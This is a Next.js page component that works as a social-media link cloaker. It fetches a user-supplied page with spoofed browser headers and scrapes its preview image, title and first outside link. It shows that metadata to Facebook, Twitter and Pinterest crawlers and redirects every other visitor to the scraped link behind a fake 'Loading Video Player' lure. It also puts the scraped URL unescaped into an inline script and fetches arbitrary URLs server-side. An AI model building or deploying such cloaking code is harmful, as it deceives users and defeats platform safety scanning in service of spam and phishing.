export default async function Home({ searchParams }) {
  const params = await searchParams;
  const targetUrl = params.url || '';

  let ogData = {
    title: "Viral Video Clip +3",
    image: "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7", 
    destination: "https://google.com" 
  };

  if (targetUrl) {
    try {
      const res = await fetch(targetUrl, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'Accept-Language': 'en-US,en;q=0.9',
          'Referer': 'https://www.google.com/'
        }
      });
      const html = await res.text();
      
      const imgMatch = html.match(/<meta[^>]*property=["']og:image["'][^>]*content=["']([^"']*)["']/i) || 
                       html.match(/<meta[^>]*name=["']twitter:image["'][^>]*content=["']([^"']*)["']/i) ||
                       html.match(/<img[^>]*src=["']([^"']*)["']/i);
      if (imgMatch) ogData.image = imgMatch[1];
      
      const titleMatch = html.match(/<meta[^>]*property=["']og:title["'][^>]*content=["']([^"']*)["']/i) ||
                        html.match(/<title>([^<]*)<\/title>/i);
      if (titleMatch) ogData.title = titleMatch[1];
      
      const urlMatches = html.match(/href=["'](https?:\/\/[^"']+)["']/gi);
      if (urlMatches) {
        for (let rawMatch of urlMatches) {
            let link = rawMatch.replace(/href=["']|["']/gi, '');
            if (!link.includes('blogspot.com') && !link.includes('google.com') && !link.includes('w3.org')) {
                ogData.destination = link;
                break; 
            }
        }
      }
    } catch (e) {
      console.error(e);
    }
  }

  return (
    <>
      <script
        dangerouslySetInnerHTML={{
          __html: `
            const isBot = /facebookexternalhit|Facebot|Twitterbot|Pinterestbot/i.test(navigator.userAgent);
            if (!isBot && "${ogData.destination}") {
              window.location.href = "${ogData.destination}";
            }
          `,
        }}
      />
      <div style={{ textAlign: 'center', marginTop: '20%', fontFamily: 'sans-serif', color: '#333' }}>
        <h2>Loading Video Player...</h2>
        <p>Please wait while the secure stream configures.</p>
      </div>
    </>
  );
    }
